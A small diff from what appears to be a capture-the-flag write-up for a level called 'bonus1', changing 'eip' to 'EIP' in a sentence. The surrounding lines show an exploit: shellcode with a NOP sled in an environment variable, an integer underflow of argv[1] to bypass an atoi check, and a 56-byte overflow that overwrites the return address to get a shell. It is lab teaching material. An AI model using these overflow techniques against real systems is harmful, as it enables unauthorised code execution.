@@ -4,7 +4,7 @@ export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\x
 ```
 
 We found an `atoi` using our `argv[1]` and a condition which using `memcpy` only if `atoi` return is under 10.
-We just need to underflow `argv[1]` to bypass the condition, after we insert into `argv[2]` a padding of 56 bytes and our `EXPLOIT` address in `eip` register :
+We just need to underflow `argv[1]` to bypass the condition, after we insert into `argv[2]` a padding of 56 bytes and our `EXPLOIT` address in `EIP` register :
 ```bash
 ./bonus1 -2147483628 $(python -c "print 'A' * 56 + '\x04\xf8\xff\xbf'")
 $ whoami
